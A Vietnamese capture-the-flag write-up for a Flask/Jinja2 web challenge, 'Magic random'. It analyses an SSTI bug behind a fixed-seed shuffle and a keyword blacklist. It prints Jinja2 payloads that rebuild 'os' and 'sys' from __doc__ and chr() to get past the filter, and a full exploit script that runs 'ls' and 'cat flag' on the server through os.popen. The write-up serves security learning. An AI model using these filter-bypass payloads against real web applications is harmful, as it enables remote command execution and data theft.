# Magic random

<figure><img src="../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>

## ANALYZE

Nhìn sơ qua thì đây là 1 tựa game đối kháng với 3 skills chính , đầu tiên là hồi máu , thứ 2 là đấm nhau bằng dame thường , thứ 3 là sucmanhtinhban&#x20;



<figure><img src="../.gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>



Ta sẽ chuyển qua phần source code&#x20;

```python
@app.route("/api/cast_attack")
def cast_attack():
    attack_name = request.args.get("attack_name", "")
    if attack_name in attack_types:
        attack = attack_types[attack_name]
        return jsonify(attack)
    else:
        try:
            attack_name=valid_template(attack_name)
            if not special_filter(attack_name):
                return jsonify({"error": "Creating magic is failed"}), 404
            template=render_template_string("<i>No magic name "+attack_name+ " here, try again!</i>")    
            return jsonify({"error": template}), 404
        except Exception as e:
            return jsonify({"error": "There is something wrong here: "+str(e)}), 404
```

<figure><img src="../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>

Ta nhận thấy rằng hàm `render_template_string` trong `/api/cast_attack` có thể gây ra lỗ hổng SSTI

Và trước khi user-input có thể tới dc hàm xử lý để render ra , thì nó đã bị filter và làm rối .



```python
RANDOM_SEED=random.randint(0,50)
....
....
def valid_template(template):
    pattern = r"^[a-zA-Z0-9 ]+$"    
    if not re.match(pattern, template):
        random.seed(RANDOM_SEED) 
        char_list = list(template)
        random.shuffle(char_list)
        template = ''.join(char_list)
    return template

def special_filter(user_input):
    simple_filter=["flag", "*", "\"", "'", "\\", "/", ";", ":", "~", "`", "+", "=", "&", "^", "%", "$", "#", "@", "!", "\n", "|", "import", "os", "request", "attr", "sys", "builtins", "class", "subclass", "config", "json", "sessions", "self", "templat", "view", "wrapper", "test", "log", "help", "cli", "blueprints", "signals", "typing", "ctx", "mro", "base", "url", "cycler", "get", "join", "name", "g.", "lipsum", "application", "render"]
    for char_num in range(len(simple_filter)):
        if simple_filter[char_num] in user_input.lower():
            return False
    return True
```

#### Hàm `valid_template(template)`

**Chức năng:**\
Xác thực chuỗi `template`. Nếu chuỗi **chỉ chứa chữ cái, số và dấu cách**, giữ nguyên. Nếu chứa ký tự khác, sẽ được **xáo trộn lại (shuffle)** bằng một seed cố định.

Điểm yếu ở đây là nếu seed là cố định, quá trình `shuffle()` sẽ luôn tạo ra cùng một chuỗi hoán vị cho cùng một đầu vào

**Chi tiết hoạt động:**

1. Dùng regex `^[a-zA-Z0-9 ]+$` để kiểm tra:
   * Chuỗi chỉ được phép chứa: chữ cái, số, dấu cách.
2. Nếu không thỏa mãn điều kiện trên:
   * Gán seed cho hàm `random` để đảm bảo kết quả shuffle là xác định.
   * Chuyển chuỗi thành danh sách ký tự, xáo trộn, sau đó nối lại thành chuỗi.
3. Trả về chuỗi đã kiểm tra hoặc đã xáo trộn.

**Mục đích:**\
Giảm khả năng tấn công thông qua việc chèn các ký tự đặc biệt vào chuỗi đầu vào, đặc biệt là trong các tình huống có sử dụng template rendering như SSTI (Server Side Template Injection).

***

#### Hàm `special_filter(user_input)`

**Chức năng:**\
Lọc và từ chối các chuỗi đầu vào có chứa các từ khóa hoặc ký tự nguy hiểm.

**Chi tiết hoạt động:**

1. Danh sách `simple_filter` chứa các từ khóa và ký tự thường được dùng trong các kỹ thuật tấn công:
   * Ký tự đặc biệt: `"`, `'`, `\`, `*`, `;`, v.v.
   * Từ khóa: `import`, `os`, `sys`, `request`, `builtins`, `class`, v.v.
2. Vòng lặp kiểm tra từng phần tử trong danh sách xem có xuất hiện trong `user_input` (đã được chuyển về chữ thường).
3. Nếu phát hiện có từ bị cấm → trả về `False`.
4. Nếu không có từ nào vi phạm → trả về `True`.

**Mục đích:**\
Ngăn chặn các kiểu tấn công như SSTI, RCE (Remote Code Execution), LFI, hoặc truy cập nội dung nhạy cảm như `flag`, `config`, v.v.





Đầu tiên , ta sẽ tiến hành tìm seed bằng script mình đi chôm được .



Ý tưởng sẽ là tìm được seed gây sáo trộn payload , rồi ta sẽ khiến nó bị sáo trộn trước rồi khi truyền untrusted data vào thì nó sẽ dc xáo trộn 1 lần nữa thành payload  đúng&#x20;



nên workflow của phần này sẽ là :&#x20;

**tìm seed → mô phỏng shuffle → tiền xử lý payload sao cho khi server shuffle lại thì payload về đúng dạng mong muốn.**



<figure><img src="../.gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>





```python
import random

# Chuỗi gốc bạn đã gửi
input_str = "abcd123456789vaca{sfwwsasvczcXYZxyz0987654321moreTEXT{}}"

# Chuỗi server trả về (trích từ JSON error, bỏ phần <i> … </i>)
server_output = "5T20om67c{8}wv3}xsTawf1cc99z25Zva83zsXYa47decXby4{1Esra6"

# Hàm shuffle với seed
def shuffle_with_seed(s, seed):
    random.seed(seed)
    chars = list(s)
    random.shuffle(chars)
    return ''.join(chars)

# Brute-force seed
candidates = []
for seed in range(51):  # RANDOM_SEED ∈ [0,50]
    result = shuffle_with_seed(input_str, seed)
    if result == server_output:
        candidates.append(seed)

print("seeds:", candidates)

```

<figure><img src="../.gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>



Tiếp đến phần khó tiếp theo là ta phải tìm được payload có thể vượt qua lớp filter này .



Sau khi đã xác định được `seed = 5`, bước tiếp theo là phải tìm cách tạo payload có thể **lọt qua blacklist** của filter 2. Như đã phân tích, blacklist chặn rất nhiều từ khóa và ký tự nhạy cảm (`flag`, `os`, `sys`, `builtins`, `'`, `"`, `+`, `*`, ...). Do đó payload phải được dựng một cách gián tiếp.

#### Ý tưởng

* **Tên module** như `"os"`, `"sys"`, `"builtins"` không thể viết thẳng → ta dựng từ `{}.__doc__`, lấy từng ký tự theo chỉ số rồi nối bằng `.__add__()`.
* **Câu lệnh shell** (`ls`, `cat flag*`, ...) cũng không thể viết thẳng vì chứa từ khóa và ký tự bị chặn → thay vào đó dùng `builtins.chr()` để mã hóa từng ký tự ASCII, sau đó nối lại bằng `.__add__()`.
* Như vậy, chuỗi lệnh cần thực thi được ghép hoàn toàn bằng phép nối và các hàm có sẵn, vượt qua blacklist.



#### Ví dụ minh họa

Payload để chạy `ls` (dùng `chr()` để tạo chữ cái):

```jinja2
{{ app.__init__.__globals__[{}.__doc__[97].__add__({}.__doc__[18]).__add__({}.__doc__[97])].modules[{}.__doc__[25].__add__({}.__doc__[97])].popen(app.__init__.__globals__[{}.__doc__[91].__add__({}.__doc__[112])...].chr(108).__add__(...)).read() }}
```

Nhìn phức tạp, nhưng thực chất chỉ là:

```python
os.popen("ls").read()
```

được viết lại bằng cách né toàn bộ blacklist.



Với 2 hàm trên, payload thực thi lệnh `cat flag*` sẽ thành:

```jinja2
{{ app.__init__.__globals__[<expr_sys>].modules[<expr_os>].popen(<expr_cmd>).read() }}
```

Trong đó:

* `<expr_sys>` = chuỗi `"sys"` được dựng bằng `__doc__`.
* `<expr_os>` = chuỗi `"os"` được dựng bằng `__doc__`.
* `<expr_cmd>` = chuỗi `"cat flag*"` được encode bằng `builtins.chr()`.



Sau khi dựng được payload chuẩn, ta cần tính toán để gửi vào server.\
Vì filter 1 sẽ shuffle input theo `seed = 5`, ta phải **pre-shuffle** payload trước khi gửi. Khi đi qua filter 1, server shuffle lần nữa và trả lại payload ban đầu hợp lệ, từ đó khai thác SSTI.



### Workflow của script do author cung cấp

hai thác thực tế được chia thành các bước:

1. **Brute-force seed** → tìm ra seed = 5.
2. **Dựng payload** → encode lệnh bằng `__doc__` và `chr()`.
3. **Tiền-shuffle** payload theo seed.
4. **Gửi request** đến `/api/cast_attack` với tham số `attack_name`.
5. **Trích kết quả** từ response.

Script full  đã được viết để tự động hóa toàn bộ quá trình:

* Tìm seed.
* Thực thi `ls | grep 'flag'` để tìm file flag.
* Thực thi `cat flag_xxx.txt` để đọc flag.

## EXPLOIT



Và đây là script hoàn chỉnh mình chôm dc từ author&#x20;



```python
import requests
import random
import re

URL="http://127.0.0.1:54551/"
MAX_SEED=50


def bruteforce_seed(url):
	print("[*] Send test payload.")

	endpoint="/api/cast_attack?attack_name="

	sample_payload="0123456789abcdef_"


	response = requests.get(url+endpoint+sample_payload)

	index_called = response.text.find("name ")
		
	if index_called != -1:
		sample_result = response.text[index_called:index_called+len(sample_payload)+7]
		print(f"Response: {sample_result}")
	else:
		print("Not found response.")
		exit()

	print("[*] Bruteforce seed.")

	def random_with_seed(template, seed):  
		random.seed(seed) 
		char_list = list(template)
		random.shuffle(char_list)
		template = ''.join(char_list)
		return template

	for i in range(0,MAX_SEED+1):
		test_result=random_with_seed(sample_payload, i)
		if(test_result in sample_result):
			true_seed=i
			print(f"Found shuffle seed: {true_seed}")
			return true_seed
		if i==MAX_SEED+1:
			print("Not found valid seed")
			exit()

def find_original_string_from_target(target_text, seed_value):
	random.seed(seed_value)
	indices = list(range(len(target_text)))
	random.shuffle(indices)
	
	original_list = [''] * len(target_text)
	for i, index in enumerate(indices):
		original_list[index] = target_text[i]
		
	original_text = ''.join(original_list)
	return original_text, indices

def create_magic_payload_by_doc(CMD):
	true_story={}.__doc__
	sample="{}.__doc__"
	result=""
	for j in range(len(CMD)):
		for i in range(len(true_story)):
			if CMD[j]==true_story[i]:
				if j==0:
					result+=f"{sample}[{i}].__add__("
				elif j==len(CMD)-1:
					result+=f"{sample}[{i}])"
				else:
					result+=f"{sample}[{i}]).__add__("
				break
			if CMD[j]!=true_story[i] and i==(len(true_story)-1):
				print(f"Letter {CMD[j]} not exist")
				break
	return result

def create_magic_payload_by_chr(CMD):
	result=""
	sample=f"app.__init__.__globals__[{create_magic_payload_by_doc('sys')}].modules[{create_magic_payload_by_doc('builtins')}]"
	for i in range(len(CMD)):
		if i == 0:
			result += sample+f".chr({ord(CMD[i])}).__add__("
		elif i == len(CMD)-1:
			result += sample+f".chr({ord(CMD[i])}))"
		else:
			result += sample+f".chr({ord(CMD[i])})).__add__("
	print(f"[+] Result of {CMD}: {result}")
	return result
	
def execute_cmd(url, seed, cmd, pattern):
	"""Pattern must be the regex of the thing you want to find"""
	print(f"[*] Create payload of {cmd}")

	target_text = "{{app.__init__.__globals__["+create_magic_payload_by_doc('sys')+"].modules["+create_magic_payload_by_doc('os')+"].popen("+create_magic_payload_by_chr(cmd)+").read()}}"    
	print(target_text)
	seed_value = seed     
	original_text, indices = find_original_string_from_target(target_text, seed_value)
	cmd_payload=original_text
	print("[+] Target payload:", target_text)          
	print("[+] Payload:", original_text)            

	print(f"[*] Execute {cmd}.")

	endpoint="/api/cast_attack?attack_name="
	response = requests.get(url+endpoint+cmd_payload)

	matches = re.findall(pattern, str(response.text))
	if matches==[]:
		print("Failed to fetch flag")
		print(response.text)
		exit()
	print(f"[+] Result is: {matches[0]}")
	return matches[0]

if __name__ == "__main__":
	# Step 1: Get seed
	seed = bruteforce_seed(URL)
	# Step 2: Execute ls to find flag file
	flag_file = execute_cmd(URL, seed, "ls | grep 'flag'", r"flag_.*\.txt")
	# Step 3: Get flag
	flag = execute_cmd(URL, seed, f"cat {flag_file}", r"HOLACTF\{[^}]+\}")


```



